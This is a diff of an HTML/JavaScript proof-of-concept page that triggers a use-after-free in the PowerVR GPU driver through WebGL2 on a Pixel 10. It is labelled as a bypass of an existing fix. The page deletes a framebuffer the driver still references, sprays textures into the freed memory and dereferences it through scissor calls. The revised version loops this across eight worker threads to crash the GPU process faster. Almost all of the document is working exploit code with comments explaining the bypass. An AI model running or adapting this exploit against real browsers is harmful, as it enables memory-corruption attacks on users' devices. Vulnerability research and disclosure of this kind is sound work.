@@ -1,83 +1,67 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PoC</title></head>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>474266014 bypass PoC (fast)</title></head>
 <body style="font-family:system-ui;margin:1em">
-<h3>PowerVR SetScissor UAF — fix bypass (ScopedBufferReattacher)</h3>
-<p>Needs a PowerVR/IMG device (Pixel 10). With MTE: clean SEGV_MTESERR in logcat.
-Without MTE: watch the counters below — a storm of <b>CONTEXT LOST</b> / a frozen page
-= the GPU process is crashing (evidence even without logcat).</p>
-<div style="font-size:20px;font-weight:bold">
-cycles: <span id="c">0</span> &nbsp;|&nbsp;
-<span style="color:#c00">CONTEXT LOST: <span id="x">0</span></span>
+<h3>PowerVR SetScissor UAF — fix bypass (fast / short-window)</h3>
+<p>Pixel 10 only. Watch the counters. A jump in <b style="color:#c00">CONTEXT LOST</b>,
+a frozen page, or Chrome "Aw snap" = GPU process crashing (the UAF). Triggers hard in the first seconds.</p>
+<div style="font-size:22px;font-weight:bold">
+iters: <span id="c">0</span> &nbsp;|&nbsp; <span style="color:#c00">CONTEXT LOST: <span id="x">0</span></span>
 </div>
-<pre id="log" style="background:#111;color:#3e6;padding:1em;white-space:pre-wrap"></pre>
+<pre id="log" style="background:#111;color:#3e6;padding:1em;white-space:pre-wrap;font-size:13px"></pre>
 <script>
-const logEl=document.getElementById('log'), cEl=document.getElementById('c'), xEl=document.getElementById('x');
-let cycles=0, lost=0;
-const log=m=>{logEl.textContent=(new Date().toLocaleTimeString()+' '+m+'\n'+logEl.textContent).slice(0,4000);};
-function bump(n){cycles+=n;cEl.textContent=cycles;}
-function onLost(where){lost++;xEl.textContent=lost;log('CONTEXT LOST ('+where+') total='+lost+'  <-- GPU process likely crashed/UAF');}
+const logEl=document.getElementById('log'),cEl=document.getElementById('c'),xEl=document.getElementById('x');
+let iters=0,lost=0;
+const log=m=>{logEl.textContent=(new Date().toLocaleTimeString()+' '+m+'\n'+logEl.textContent).slice(0,3000);};
+const onLost=w=>{lost++;xEl.textContent=lost;log('*** CONTEXT LOST ('+w+') total='+lost+' -> GPU crash/UAF ***');};
 
-// One bypass cycle. Leaves driver "previous complete FBO" = freed user FBO A, then scissors.
-function cycle(onlost){
-  const canvas=new OffscreenCanvas(256,256);
-  const gl=canvas.getContext('webgl2',{antialias:false,depth:false,stencil:false});
-  if(!gl) return false;
-  try{ canvas.addEventListener('webglcontextlost',()=>onlost('offscreen')); }catch(e){}
-
-  const R=gl.createRenderbuffer();
-  gl.bindRenderbuffer(gl.RENDERBUFFER,R);
-  gl.renderbufferStorage(gl.RENDERBUFFER,gl.RGBA8,64,64);
-  const A=gl.createFramebuffer();
-  gl.bindFramebuffer(gl.FRAMEBUFFER,A);
-  gl.framebufferRenderbuffer(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.RENDERBUFFER,R); // A complete
-
-  const Rb=gl.createRenderbuffer();
-  gl.bindRenderbuffer(gl.RENDERBUFFER,Rb);
-  gl.renderbufferStorage(gl.RENDERBUFFER,gl.RGBA8,64,64);
-  const B=gl.createFramebuffer();
-  gl.bindFramebuffer(gl.FRAMEBUFFER,B);
-  gl.framebufferRenderbuffer(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.RENDERBUFFER,Rb); // current=B, A not current
-
-  // Resize R while attached to A -> ScopedBufferReattacher direct-binds A then B
-  // (bypasses complete_fbo_) -> driver "previous complete FBO" = A.
-  gl.bindRenderbuffer(gl.RENDERBUFFER,R);
-  gl.renderbufferStorage(gl.RENDERBUFFER,gl.RGBA8,128,128);
-
-  gl.deleteFramebuffer(A); // A not current -> not rebound -> "previous" dangles.
-
-  const pool=[]; // spray freed slot
-  for(let i=0;i<24;i++){const t=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,t);
-    gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA8,32,32,0,gl.RGBA,gl.UNSIGNED_BYTE,null);pool.push(t);}
-
-  gl.enable(gl.SCISSOR_TEST); // SetScissor derefs freed "previous complete FBO"
-  for(let i=0;i<64;i++){gl.scissor((Math.random()*40)|0,(Math.random()*40)|0,10,10);gl.clear(gl.COLOR_BUFFER_BIT);}
+// Reused-context tight loop. Each iter: attach R->A (complete), bind B (current),
+// resize R (ScopedBufferReattacher direct-binds A then B -> driver "previous complete"=A),
+// delete A (not current -> not rebound -> dangling), spray, scissor (SetScissor derefs freed A).
+const LOOP = function(gl, onlost){
+  const RB=gl.RENDERBUFFER, FB=gl.FRAMEBUFFER, C0=gl.COLOR_ATTACHMENT0, T2=gl.TEXTURE_2D;
+  const Rb=gl.createRenderbuffer(); gl.bindRenderbuffer(RB,Rb); gl.renderbufferStorage(RB,gl.RGBA8,64,64);
+  const B=gl.createFramebuffer(); gl.bindFramebuffer(FB,B); gl.framebufferRenderbuffer(FB,C0,RB,Rb);
+  gl.enable(gl.SCISSOR_TEST);
+  let n=0;
+  for(let i=0;i<2000;i++){
+    const R=gl.createRenderbuffer(); gl.bindRenderbuffer(RB,R); gl.renderbufferStorage(RB,gl.RGBA8,64,64);
+    const A=gl.createFramebuffer(); gl.bindFramebuffer(FB,A); gl.framebufferRenderbuffer(FB,C0,RB,R); // A complete
+    gl.bindFramebuffer(FB,B);                                   // current=B, A not current
+    gl.bindRenderbuffer(RB,R); gl.renderbufferStorage(RB,gl.RGBA8,(i&1)?128:96,(i&1)?128:96); // -> "previous complete"=A
+    gl.deleteFramebuffer(A);                                    // dangling
+    const t=gl.createTexture(); gl.bindTexture(T2,t);
+    gl.texImage2D(T2,0,gl.RGBA8,16,16,0,gl.RGBA,gl.UNSIGNED_BYTE,null); // spray freed slot
+    gl.scissor(i&31,i&31,10,10); gl.clear(gl.COLOR_BUFFER_BIT);  // SetScissor derefs freed A
+    gl.deleteRenderbuffer(R); gl.deleteTexture(t);
+    n++;
+    if(gl.isContextLost()){ onlost('loop'); return n; }
+  }
   gl.flush();
-  return true;
-}
+  return n;
+};
 
 function run(){
-  const tick=()=>{
-    for(let k=0;k<8;k++){ if(!cycle(onLost)){log('no webgl2');return;} }
-    bump(8);
-    setTimeout(tick,0);
-  };
+  const canvas=new OffscreenCanvas(256,256);
+  const gl=canvas.getContext('webgl2',{antialias:false,depth:false,stencil:false});
+  if(!gl){log('no webgl2 (main)');return;}
+  try{canvas.addEventListener('webglcontextlost',()=>onLost('main'));}catch(e){}
+  const tick=()=>{ const n=LOOP(gl,onLost); iters+=n; cEl.textContent=iters;
+    if(!gl.isContextLost()) setTimeout(tick,0); };
   tick();
 }
 
-// Widen the race/alloc window with worker copies (as in the original report).
-const wsrc=`const cycle=${cycle.toString()};
-onmessage=()=>{ (function t(){ let n=0; for(let k=0;k<8;k++){ if(cycle(()=>postMessage('lost'))) n++; }
-  postMessage(n); setTimeout(t,0); })(); };`;
+// 8 worker copies to widen the alloc/race window and hit the GPU process hard.
+const wsrc='const LOOP='+LOOP.toString()+';'+
+  'onmessage=()=>{const c=new OffscreenCanvas(256,256);const gl=c.getContext("webgl2",{antialias:false});'+
+  'if(!gl){postMessage({e:"nowebgl"});return;}try{c.addEventListener("webglcontextlost",()=>postMessage({lost:1}));}catch(e){}'+
+  '(function t(){const n=LOOP(gl,()=>postMessage({lost:1}));postMessage({n});if(!gl.isContextLost())setTimeout(t,0);})();};';
 try{
   const url=URL.createObjectURL(new Blob([wsrc],{type:'text/javascript'}));
-  for(let i=0;i<6;i++){ const w=new Worker(url);
-    w.onmessage=e=>{ if(e.data==='lost') onLost('worker'); else bump(e.data); };
-    w.postMessage(1); }
-}catch(e){ log('worker spawn failed: '+e); }
+  for(let i=0;i<8;i++){const w=new Worker(url);
+    w.onmessage=e=>{const d=e.data||{};if(d.lost)onLost('worker');else if(d.n){iters+=d.n;cEl.textContent=iters;}else if(d.e)log('worker: '+d.e);};
+    w.postMessage(1);}
+}catch(e){log('worker spawn failed: '+e);}
 
 run();
-</script>
-</body>
-</html>
+</script></body></html>
